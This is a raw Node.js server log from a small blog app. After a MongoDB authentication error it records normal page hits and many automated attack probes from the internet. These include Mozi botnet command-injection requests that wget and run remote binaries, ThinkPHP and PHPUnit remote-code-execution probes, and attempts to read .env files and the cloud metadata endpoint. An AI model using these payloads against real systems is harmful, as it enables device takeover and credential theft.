(node:26518) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose disconnected
Mongoose connection error: MongoNetworkError: failed to connect to server [localhost:27017] on first connect [MongoError: Authentication failed.
    at Connection.messageHandler (/home/bitnami/blog/node_modules/mongodb/lib/core/connection/connection.js:360:19)
    at Connection.emit (events.js:315:20)
    at processMessage (/home/bitnami/blog/node_modules/mongodb/lib/core/connection/connection.js:452:10)
    at Socket.<anonymous> (/home/bitnami/blog/node_modules/mongodb/lib/core/connection/connection.js:621:15)
    at Socket.emit (events.js:315:20)
    at addChunk (_stream_readable.js:295:12)
    at readableAddChunk (_stream_readable.js:271:9)
    at Socket.Readable.push (_stream_readable.js:212:10)
    at TCP.onStreamRead (internal/stream_base_commons.js:186:23) {
  ok: 0,
  code: 18,
  codeName: 'AuthenticationFailed'
}]
(node:26518) UnhandledPromiseRejectionWarning: MongoNetworkError: failed to connect to server [localhost:27017] on first connect [MongoError: Authentication failed.
    at Connection.messageHandler (/home/bitnami/blog/node_modules/mongodb/lib/core/connection/connection.js:360:19)
    at Connection.emit (events.js:315:20)
    at processMessage (/home/bitnami/blog/node_modules/mongodb/lib/core/connection/connection.js:452:10)
    at Socket.<anonymous> (/home/bitnami/blog/node_modules/mongodb/lib/core/connection/connection.js:621:15)
    at Socket.emit (events.js:315:20)
    at addChunk (_stream_readable.js:295:12)
    at readableAddChunk (_stream_readable.js:271:9)
    at Socket.Readable.push (_stream_readable.js:212:10)
    at TCP.onStreamRead (internal/stream_base_commons.js:186:23) {
  ok: 0,
  code: 18,
  codeName: 'AuthenticationFailed'
}]
    at Pool.<anonymous> (/home/bitnami/blog/node_modules/mongodb/lib/core/topologies/server.js:438:11)
    at Pool.emit (events.js:315:20)
    at /home/bitnami/blog/node_modules/mongodb/lib/core/connection/pool.js:562:14
    at /home/bitnami/blog/node_modules/mongodb/lib/core/connection/pool.js:995:11
    at callback (/home/bitnami/blog/node_modules/mongodb/lib/core/connection/connect.js:75:5)
    at /home/bitnami/blog/node_modules/mongodb/lib/core/connection/connect.js:147:27
    at /home/bitnami/blog/node_modules/mongodb/lib/core/auth/scram.js:108:14
    at _callback (/home/bitnami/blog/node_modules/mongodb/lib/core/connection/connection.js:329:7)
    at Connection.messageHandler (/home/bitnami/blog/node_modules/mongodb/lib/core/connection/connection.js:360:9)
    at Connection.emit (events.js:315:20)
    at processMessage (/home/bitnami/blog/node_modules/mongodb/lib/core/connection/connection.js:452:10)
    at Socket.<anonymous> (/home/bitnami/blog/node_modules/mongodb/lib/core/connection/connection.js:621:15)
    at Socket.emit (events.js:315:20)
    at addChunk (_stream_readable.js:295:12)
    at readableAddChunk (_stream_readable.js:271:9)
    at Socket.Readable.push (_stream_readable.js:212:10)
(node:26518) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). To terminate the node process on unhandled promise rejection, use the CLI flag `--unhandled-rejections=strict` (see https://nodejs.org/api/cli.html#cli_unhandled_rejections_mode). (rejection id: 1)
(node:26518) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
[0mGET / [36m304 [0m9.723 ms - -[0m
[0mGET /blogedit [32m200 [0m3.597 ms - 1994[0m
[0mGET /images/construction.gif [36m304 [0m1.307 ms - -[0m
[0mGET /blogdelete [32m200 [0m1.379 ms - 1920[0m
[0mGET /images/construction.gif [36m304 [0m0.716 ms - -[0m
[0mGET /blogdelete [36m304 [0m1.862 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.491 ms - -[0m
[0mGET / [36m304 [0m1.341 ms - -[0m
[0mGET /blogadd [36m304 [0m1.260 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.538 ms - -[0m
[0mGET /bloglist [36m304 [0m1.516 ms - -[0m
[0mGET /images/postImage.png [32m200 [0m2.094 ms - 170047[0m
[0mGET /blogadd [36m304 [0m1.302 ms - -[0m
[0mGET /blogedit [32m200 [0m1.198 ms - 1994[0m
[0mGET /images/construction.gif [36m304 [0m0.429 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m1.440 ms - -[0m
[0mGET /bloglist [36m304 [0m1.388 ms - -[0m
[0mGET /images/postImage.png [36m304 [0m0.525 ms - -[0m
[0mGET /blogdelete [32m200 [0m0.976 ms - 1920[0m
[0mGET /images/construction.gif [36m304 [0m0.506 ms - -[0m
[0mGET /bloglist [36m304 [0m1.115 ms - -[0m
[0mGET /images/postImage.png [36m304 [0m0.435 ms - -[0m
[0mGET /blogedit [36m304 [0m1.029 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.515 ms - -[0m
[0mGET /blogdelete [36m304 [0m2.089 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.538 ms - -[0m
[0mGET /bloglist [36m304 [0m1.080 ms - -[0m
[0mGET /images/postImage.png [36m304 [0m0.436 ms - -[0m
[0mGET /blogadd [36m304 [0m0.896 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.512 ms - -[0m
[0mGET /blogdelete [36m304 [0m0.933 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.421 ms - -[0m
[0mGET /blogedit [36m304 [0m1.061 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.499 ms - -[0m
[0mGET /bloglist [36m304 [0m1.961 ms - -[0m
[0mGET /images/postImage.png [36m304 [0m0.430 ms - -[0m
[0mGET /blogadd [36m304 [0m1.027 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.483 ms - -[0m
[0mGET / [36m304 [0m0.963 ms - -[0m
[0mGET / [32m200 [0m1.186 ms - 1934[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m1.514 ms - 1418[0m
[0mGET / [32m200 [0m0.908 ms - 1934[0m
[0mGET / [32m200 [0m1.862 ms - 1934[0m
[0mGET / [32m200 [0m0.937 ms - 1934[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.195 ms - 1418[0m
[0mGET / [32m200 [0m1.049 ms - 1934[0m
[0mGET / [32m200 [0m0.777 ms - 1934[0m
[0mGET http://169.254.169.254/latest/meta-data/ [33m404 [0m1.071 ms - 1418[0m
[0mGET / [32m200 [0m0.937 ms - 1934[0m
[0mGET / [32m200 [0m0.945 ms - 1934[0m
[0mGET / [32m200 [0m0.868 ms - 1934[0m
[0mGET / [32m200 [0m0.995 ms - 1934[0m
[0mGET / [32m200 [0m0.874 ms - 1934[0m
[0mGET http://5.188.210.227/echo.php [33m404 [0m1.174 ms - 1418[0m
[0mGET / [32m200 [0m0.886 ms - 1934[0m
[0mGET / [32m200 [0m0.852 ms - 1934[0m
[0mGET / [32m200 [0m0.973 ms - 1934[0m
[0mGET / [32m200 [0m1.644 ms - 1934[0m
[0mGET / [32m200 [0m0.905 ms - 1934[0m
[0mGET / [32m200 [0m0.813 ms - 1934[0m
[0mGET / [32m200 [0m0.777 ms - 1934[0m
[0mGET / [32m200 [0m0.703 ms - 1934[0m
[0mGET / [32m200 [0m0.959 ms - 1934[0m
[0mGET / [32m200 [0m0.904 ms - 1934[0m
[0mGET / [32m200 [0m0.957 ms - 1934[0m
[0mGET / [32m200 [0m1.539 ms - 1934[0m
[0mGET / [32m200 [0m0.907 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.019 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.859 ms - 1934[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.864 ms - 1413[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.909 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.035 ms - 1418[0m
[0mGET / [32m200 [0m0.991 ms - 1934[0m
[0mGET /robots.txt [33m404 [0m1.043 ms - 1418[0m
[0mGET /sitemap.xml [33m404 [0m0.978 ms - 1418[0m
[0mGET /.well-known/security.txt [33m404 [0m1.083 ms - 1418[0m
[0mGET /favicon.ico [33m404 [0m0.990 ms - 1418[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.944 ms - 1418[0m
[0mGET / [32m200 [0m0.878 ms - 1934[0m
[0mGET / [32m200 [0m0.928 ms - 1934[0m
[0mGET /photo/ [33m404 [0m1.022 ms - 1418[0m
[0mGET / [32m200 [0m0.922 ms - 1934[0m
[0mGET / [32m200 [0m0.900 ms - 1934[0m
[0mGET / [32m200 [0m1.000 ms - 1934[0m
[0mGET /hudson [33m404 [0m1.071 ms - 1418[0m
[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404 [0m1.050 ms - 1418[0m
[0mPOST /api/jsonws/invoke [33m404 [0m15.343 ms - 1413[0m
[0mGET / [32m200 [0m0.844 ms - 1934[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.970 ms - 1418[0m
[0mGET /boaform/admin/formLogin?username=admin&psd=admin [33m404 [0m1.010 ms - 1418[0m
[0mGET / [32m200 [0m0.848 ms - 1934[0m
[0mGET / [32m200 [0m0.936 ms - 1934[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.59.65.166:40217/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m3.021 ms - 1418[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.975 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.881 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.944 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.021 ms - 1418[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.975 ms - 1413[0m
[0mGET / [32m200 [0m0.821 ms - 1934[0m
[0mGET / [32m200 [0m0.949 ms - 1934[0m
[0mGET /phpmyadmin/ [33m404 [0m0.997 ms - 1418[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.024 ms - 1418[0m
[0mGET / [32m200 [0m0.895 ms - 1934[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.717 ms - 1413[0m
[0mGET /connector.sds [33m404 [0m1.043 ms - 1418[0m
[0mPOST /HNAP1/ [33m404 [0m1.757 ms - 1413[0m
[0mGET /.env [33m404 [0m0.904 ms - 1418[0m
[0mPOST / [33m404 [0m2.131 ms - 1413[0m
[0mGET / [32m200 [0m0.894 ms - 1934[0m
[0mPOST /cgi-bin/mainfunction.cgi [33m404 [0m0.783 ms - 1413[0m
[0mGET /portal/redlion [33m404 [0m0.943 ms - 1418[0m
[0mGET / [32m200 [0m0.914 ms - 1934[0m
[0mGET / [32m200 [0m0.808 ms - 1934[0m
[0mGET / [32m200 [0m0.915 ms - 1934[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.993 ms - 1418[0m
[0mGET / [32m200 [0m0.832 ms - 1934[0m
[0mGET / [32m200 [0m0.932 ms - 1934[0m
[0mGET / [32m200 [0m0.849 ms - 1934[0m
[0mGET / [32m200 [0m0.873 ms - 1934[0m
[0mGET / [32m200 [0m0.893 ms - 1934[0m
[0mGET /robots.txt [33m404 [0m1.486 ms - 1418[0m
[0mGET /favicon.ico [33m404 [0m0.795 ms - 1418[0m
[0mGET / [32m200 [0m0.969 ms - 1934[0m
[0mGET / [32m200 [0m0.877 ms - 1934[0m
[0mGET / [32m200 [0m0.848 ms - 1934[0m
[0mGET / [32m200 [0m0.874 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.033 ms - 1418[0m
[0mGET / [32m200 [0m0.944 ms - 1934[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.887 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.944 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.860 ms - 1418[0m
[0mOPTIONS / [32m200 [0m1.317 ms - 8[0m
[0mGET http://163.172.88.110:41298/1 [33m404 [0m1.063 ms - 1418[0m
[0mGET http://163.172.88.110:41298/1 [33m404 [0m0.930 ms - 1418[0m
[0mGET http://163.172.88.110:41298/1 [33m404 [0m1.001 ms - 1418[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.022 ms - 1418[0m
[0mGET / [32m200 [0m0.902 ms - 1934[0m
[0mGET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bls%20%23&password=asdf [0m- [0m- ms - -[0m
[0mGET / [32m200 [0m1.744 ms - 1934[0m
[0mGET / [32m200 [0m0.722 ms - 1934[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.985 ms - 1413[0m
[0mGET /TP/public/index.php [33m404 [0m0.973 ms - 1418[0m
[0mGET /TP/index.php [33m404 [0m1.006 ms - 1418[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m4.849 ms - 1418[0m
[0mGET /html/public/index.php [33m404 [0m0.921 ms - 1418[0m
[0mGET /public/index.php [33m404 [0m0.972 ms - 1418[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.984 ms - 1418[0m
[0mGET /elrekt.php [33m404 [0m0.915 ms - 1418[0m
[0mGET /index.php [33m404 [0m1.012 ms - 1418[0m
[0mGET / [32m200 [0m0.864 ms - 1934[0m
[0mGET /TP/public/index.php [33m404 [0m0.971 ms - 1418[0m
[0mGET /TP/index.php [33m404 [0m1.003 ms - 1418[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m1.030 ms - 1418[0m
[0mGET /html/public/index.php [33m404 [0m1.006 ms - 1418[0m
[0mGET /public/index.php [33m404 [0m0.987 ms - 1418[0m
[0mGET /TP/html/public/index.php [33m404 [0m1.799 ms - 1418[0m
[0mGET /elrekt.php [33m404 [0m0.959 ms - 1418[0m
[0mGET /index.php [33m404 [0m7.240 ms - 1418[0m
[0mGET / [32m200 [0m0.836 ms - 1934[0m
[0mGET / [32m200 [0m1.331 ms - 1934[0m
[0mGET / [32m200 [0m0.724 ms - 1934[0m
[0mGET /hudson [33m404 [0m0.943 ms - 1418[0m
[0mGET /.env [33m404 [0m0.835 ms - 1418[0m
[0mPOST / [33m404 [0m1.076 ms - 1413[0m
[0mGET / [32m200 [0m0.954 ms - 1934[0m
[0mGET / [32m200 [0m0.843 ms - 1934[0m
[0mGET / [32m200 [0m0.885 ms - 1934[0m
[0mGET / [32m200 [0m0.879 ms - 1934[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.230.246.115:33268/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.947 ms - 1418[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.937 ms - 1418[0m
[0mGET / [32m200 [0m0.891 ms - 1934[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.943 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.833 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.962 ms - 1418[0m
[0mHEAD /robots.txt [33m404 [0m0.918 ms - 1418[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.794 ms - 1413[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.992 ms - 1413[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.757 ms - 1413[0m
[0mGET / [32m200 [0m0.903 ms - 1934[0m
[0mGET /.env [33m404 [0m0.873 ms - 1418[0m
[0mGET /portal/.env [33m404 [0m0.688 ms - 1418[0m
[0mGET /laravel/.env [33m404 [0m0.641 ms - 1418[0m
[0mGET /public/.env [33m404 [0m0.647 ms - 1418[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.066 ms - 1418[0m
[0mGET / [32m200 [0m0.847 ms - 1934[0m
[0mGET / [32m200 [0m0.685 ms - 1934[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.010 ms - 1413[0m
[0mGET / [32m200 [0m1.700 ms - 1934[0m
[0mGET / [32m200 [0m0.908 ms - 1934[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.963 ms - 1418[0m
[0mGET / [32m200 [0m0.897 ms - 1934[0m
[0mGET / [32m200 [0m0.692 ms - 1934[0m
[0mGET / [32m200 [0m0.883 ms - 1934[0m
[0mGET / [32m200 [0m0.866 ms - 1934[0m
[0mGET / [32m200 [0m0.727 ms - 1934[0m
[0mGET / [32m200 [0m1.720 ms - 1934[0m
[0mGET / [32m200 [0m0.714 ms - 1934[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.946 ms - 1418[0m
[0mGET http://judge.proxyscrape.com/ [32m200 [0m0.867 ms - 1934[0m
[0mGET /portal/redlion [33m404 [0m0.953 ms - 1418[0m
[0mHEAD /robots.txt [33m404 [0m0.973 ms - 1418[0m
[0mGET /.env [33m404 [0m0.853 ms - 1418[0m
[0mPOST / [33m404 [0m0.849 ms - 1413[0m
[0mGET /.env [33m404 [0m1.671 ms - 1418[0m
[0mPOST / [33m404 [0m1.058 ms - 1413[0m
[0mGET / [32m200 [0m0.878 ms - 1934[0m
[0mGET / [32m200 [0m0.829 ms - 1934[0m
[0mGET / [32m200 [0m0.667 ms - 1934[0m
[0mGET / [32m200 [0m0.845 ms - 1934[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.956 ms - 1418[0m
[0mGET / [32m200 [0m0.923 ms - 1934[0m
[0mGET http://example.com/ [32m200 [0m1.843 ms - 1934[0m
[0mGET / [32m200 [0m0.805 ms - 1934[0m
[0mGET / [32m200 [0m0.889 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.953 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.853 ms - 1934[0m
[0mGET / [32m200 [0m0.873 ms - 1934[0m
[0mGET / [32m200 [0m0.910 ms - 1934[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.795 ms - 1413[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m1.638 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.934 ms - 1418[0m
[0mGET / [32m200 [0m0.829 ms - 1934[0m
[0mGET http://www.google.com [32m200 [0m0.906 ms - 1934[0m
[0mPOST /cgi-bin/mainfunction.cgi [33m404 [0m0.794 ms - 1413[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.996 ms - 1413[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://119.165.232.157:51497/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.971 ms - 1418[0m
[0mGET http://www.ip138.com/ [32m200 [0m1.567 ms - 1934[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m1.035 ms - 1418[0m
[0mGET / [32m200 [0m1.793 ms - 1934[0m
[0mGET / [32m200 [0m0.864 ms - 1934[0m
[0mGET /manager/text/list [33m404 [0m1.384 ms - 1418[0m
[0mGET /.env [33m404 [0m5.618 ms - 1418[0m
[0mPOST / [33m404 [0m0.995 ms - 1413[0m
[0mGET /.env [33m404 [0m0.834 ms - 1418[0m
[0mPOST / [33m404 [0m1.049 ms - 1413[0m
[0mGET /manager/html [33m404 [0m3.416 ms - 1418[0m
[0mGET /manager/html [33m404 [0m0.972 ms - 1418[0m
[0mGET /.env [33m404 [0m0.887 ms - 1418[0m
[0mGET /vendor/.env [33m404 [0m0.910 ms - 1418[0m
[0mGET /storage/.env [33m404 [0m0.886 ms - 1418[0m
[0mGET /public/.env [33m404 [0m0.907 ms - 1418[0m
[0mPOST / [33m404 [0m1.091 ms - 1413[0m
[0mGET /boaform/admin/formLogin?username=admin&psd=admin [33m404 [0m1.030 ms - 1418[0m
[0mGET / [32m200 [0m0.845 ms - 1934[0m
[0mGET / [32m200 [0m0.839 ms - 1934[0m
[0mGET / [32m200 [0m0.835 ms - 1934[0m
[0mGET / [32m200 [0m1.769 ms - 1934[0m
[0mGET / [32m200 [0m0.867 ms - 1934[0m
[0mGET / [32m200 [0m0.647 ms - 1934[0m
[0mGET / [32m200 [0m0.808 ms - 1934[0m
[0mGET / [32m200 [0m0.924 ms - 1934[0m
[0mGET /.env [33m404 [0m0.922 ms - 1418[0m
[0mPOST / [33m404 [0m0.865 ms - 1413[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.010 ms - 1418[0m
[0mGET /.env [33m404 [0m1.782 ms - 1418[0m
[0mPOST / [33m404 [0m1.031 ms - 1413[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.863 ms - 1934[0m
[0mGET / [32m200 [0m0.838 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.807 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.931 ms - 1418[0m
[0mGET / [32m200 [0m0.806 ms - 1934[0m
[0mGET / [32m200 [0m0.817 ms - 1934[0m
[0mGET / [32m200 [0m0.871 ms - 1934[0m
[0mGET / [32m200 [0m1.814 ms - 1934[0m
[0mGET / [32m200 [0m0.874 ms - 1934[0m
[0mGET / [32m200 [0m0.860 ms - 1934[0m
[0mGET / [32m200 [0m0.942 ms - 1934[0m
[0mGET / [32m200 [0m0.816 ms - 1934[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://60.215.166.95:33306/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.995 ms - 1418[0m
[0mGET / [32m200 [0m0.871 ms - 1934[0m
[0mGET / [32m200 [0m0.824 ms - 1934[0m
[0mPOST /api/jsonws/invoke [33m404 [0m3.623 ms - 1413[0m
[0mGET / [32m200 [0m0.907 ms - 1934[0m
[0mGET / [32m200 [0m0.803 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.945 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.815 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.848 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.965 ms - 1418[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m0.965 ms - 1418[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.930 ms - 1413[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.897 ms - 1418[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.024 ms - 1413[0m
[0mGET / [32m200 [0m0.803 ms - 1934[0m
[0mGET / [32m200 [0m0.911 ms - 1934[0m
[0mGET / [32m200 [0m0.824 ms - 1934[0m
[0mGET / [32m200 [0m0.870 ms - 1934[0m
[0mGET / [32m200 [0m0.862 ms - 1934[0m
[0mGET / [32m200 [0m0.886 ms - 1934[0m
[0mGET / [32m200 [0m0.824 ms - 1934[0m
[0mGET / [32m200 [0m4.563 ms - 1934[0m
[0mGET / [32m200 [0m0.865 ms - 1934[0m
[0mGET / [32m200 [0m0.676 ms - 1934[0m
[0mGET / [32m200 [0m0.798 ms - 1934[0m
[0mGET / [32m200 [0m0.882 ms - 1934[0m
[0mGET / [32m200 [0m0.740 ms - 1934[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m0.956 ms - 1418[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.907 ms - 1418[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.925 ms - 1418[0m
[0mGET /db/scripts/setup.py [33m404 [0m1.769 ms - 1418[0m
[0mGET /mysqladmin/scripts/setup.py [33m404 [0m0.931 ms - 1418[0m
[0mGET /mysql/scripts/setup.py [33m404 [0m0.947 ms - 1418[0m
[0mGET /myadmin/scripts/setup.py [33m404 [0m1.020 ms - 1418[0m
[0mGET /phpMyAdmin-3.1.2.0-english/scripts/setup.php [33m404 [0m0.931 ms - 1418[0m
[0mGET /phpmyadmin1/scripts/setup.php [33m404 [0m0.968 ms - 1418[0m
[0mGET /phpMyAdmin2/scripts/setup.php [33m404 [0m0.973 ms - 1418[0m
[0mGET /phpMyAdmin-2.11.4/scripts/setup.php [33m404 [0m0.968 ms - 1418[0m
[0mGET /phpMyAdmin-2.11.3/scripts/setup.php [33m404 [0m0.901 ms - 1418[0m
[0mGET /admin/pma/scripts/setup.php [33m404 [0m1.832 ms - 1418[0m
[0mGET /database/scripts/setup.php [33m404 [0m0.988 ms - 1418[0m
[0mGET /pma/scripts/setup.php [33m404 [0m0.994 ms - 1418[0m
[0mGET / [32m200 [0m0.835 ms - 1934[0m
[0mGET / [32m200 [0m0.812 ms - 1934[0m
[0mGET / [32m200 [0m0.825 ms - 1934[0m
[0mGET / [32m200 [0m0.806 ms - 1934[0m
[0mGET / [32m200 [0m0.902 ms - 1934[0m
[0mGET /.env [33m404 [0m0.887 ms - 1418[0m
[0mPOST / [33m404 [0m1.968 ms - 1413[0m
[0mGET /phpmyadmin/ [33m404 [0m0.999 ms - 1418[0m
[0mGET / [32m200 [0m0.861 ms - 1934[0m
[0mGET / [32m200 [0m0.825 ms - 1934[0m
[0mGET / [32m200 [0m0.883 ms - 1934[0m
[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404 [0m0.967 ms - 1418[0m
[0mGET /.env [33m404 [0m0.876 ms - 1418[0m
[0mPOST / [33m404 [0m1.010 ms - 1413[0m
[0mHEAD / [32m200 [0m0.883 ms - 1934[0m
[0mGET / [32m200 [0m1.715 ms - 1934[0m
[0mGET / [32m200 [0m0.867 ms - 1934[0m
[0mGET / [32m200 [0m0.688 ms - 1934[0m
[0mGET / [32m200 [0m0.863 ms - 1934[0m
[0mGET / [32m200 [0m0.867 ms - 1934[0m
[0mGET / [32m200 [0m0.877 ms - 1934[0m
[0mGET / [32m200 [0m0.872 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.985 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.907 ms - 1934[0m
[0mGET / [32m200 [0m0.826 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.824 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.033 ms - 1418[0m
[0mGET / [32m200 [0m1.529 ms - 1934[0m
[0mGET / [32m200 [0m0.844 ms - 1934[0m
[0mPOST /api/jsonws/invoke [33m404 [0m8.539 ms - 1413[0m
[0mGET / [32m200 [0m0.898 ms - 1934[0m
[0mGET / [32m200 [0m0.841 ms - 1934[0m
[0mGET / [32m200 [0m0.867 ms - 1934[0m
[0mGET / [32m200 [0m0.825 ms - 1934[0m
[0mGET / [32m200 [0m0.832 ms - 1934[0m
[0mGET / [32m200 [0m0.820 ms - 1934[0m
[0mGET / [32m200 [0m0.844 ms - 1934[0m
[0mGET / [32m200 [0m0.864 ms - 1934[0m
[0mPOST /HNAP1/ [33m404 [0m0.856 ms - 1413[0m
[0mPOST /HNAP1/ [33m404 [0m0.853 ms - 1413[0m
[0mGET / [32m200 [0m0.858 ms - 1934[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m1.909 ms - 1418[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.858 ms - 1418[0m
[0mGET /mysqladmin/scripts/setup.php [33m404 [0m0.999 ms - 1418[0m
[0mGET /db/scripts/setup.php [33m404 [0m0.927 ms - 1418[0m
[0mGET /portal/redlion [33m404 [0m0.987 ms - 1418[0m
[0mGET / [32m200 [0m0.846 ms - 1934[0m
[0mGET / [32m200 [0m0.822 ms - 1934[0m
[0mGET / [32m200 [0m0.882 ms - 1934[0m
[0mGET / [32m200 [0m0.867 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.749 ms - 1418[0m
[0mGET / [32m200 [0m0.863 ms - 1934[0m
[0mGET / [32m200 [0m0.831 ms - 1934[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.840 ms - 1934[0m
